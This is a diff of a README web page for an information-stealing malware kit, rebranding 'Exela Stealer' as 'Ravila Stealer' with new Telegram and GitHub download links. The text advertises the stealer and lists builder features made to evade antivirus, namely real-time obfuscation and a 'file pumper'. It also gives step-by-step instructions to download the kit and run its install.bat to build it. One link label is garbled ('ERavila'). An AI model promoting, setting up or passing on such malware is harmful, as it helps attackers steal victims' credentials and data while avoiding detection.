@@ -6,9 +6,9 @@
 <head>
 
 <!-- Content -->
-<h1 id="exela-stealer">Exela Stealer</h1>
-<p>Exela Stealer, a powerful and feature-rich tool, offers the following functionalities:<br>
-   <a href="https://t.me/ExelaStealer">Telegram Adress</a> - Join our Telegram channel for the latest developments
+<h1 id="ravila-stealer">Ravila Stealer</h1>
+<p>Ravila Stealer, a powerful and feature-rich tool, offers the following functionalities:<br>
+   <a href="https://t.me/RavilaStealer">Telegram Adress</a> - Join our Telegram channel for the latest developments
 </p>
 
 <!-- Features Section -->
@@ -62,7 +62,7 @@
 
 <!-- Builder Settings Section -->
 <h2 id="builder-settings">Builder Settings 🔧</h2>
-<p>Exela Stealer's builder provides the following options:</p>
+<p>Ravila Stealer's builder provides the following options:</p>
 <ul>
   <li>:twisted_rightwards_arrows: <strong>Realtime Obfuscation</strong> - Applies real-time obfuscation techniques.</li>
   <li>:floppy_disk: <strong>File Pumper</strong> (Optional) - Pump your file size to evade detection.</li>
@@ -73,12 +73,12 @@
 
 <!-- How to Build Section -->
 <h2 id="how-to-build">How to Build 🛠️</h2>
-<p>To set up Exela Stealer, follow these steps:</p>
+<p>To set up Ravila Stealer, follow these steps:</p>
 <ol>
   <li>:arrow_down: Download and Install <a href="https://www.python.org/ftp/python/3.11.0/python-3.11.0-amd64.exe">python 3.11.0</a></li>
-  <li>:arrow_down: <a href="https://github.com/quicaxd/Exela-V2.0/archive/refs/heads/main.zip">Download Exela Stealer</a></li>
+  <li>:arrow_down: <a href="https://github.com/quicaxd/Ravila-V2.0/archive/refs/heads/main.zip">Download ERavila Stealer</a></li>
   <li>:arrow_down: <a href="https://www.pcworld.com/article/394871/how-to-unzip-files-in-windows-10.html#:~:text=Unzip%20all%20files%20in%20a%20ZIP%20file">Extract</a> the zip file.</li>
-  <li>:point_right: Navigate to the Exela Stealer folder and double click <code>install.bat</code>.</li>
+  <li>:point_right: Navigate to the Ravila Stealer folder and double click <code>install.bat</code>.</li>
   <li>:rocket: Follow the on-screen instructions to complete the setup.</li>
 </ol>
 
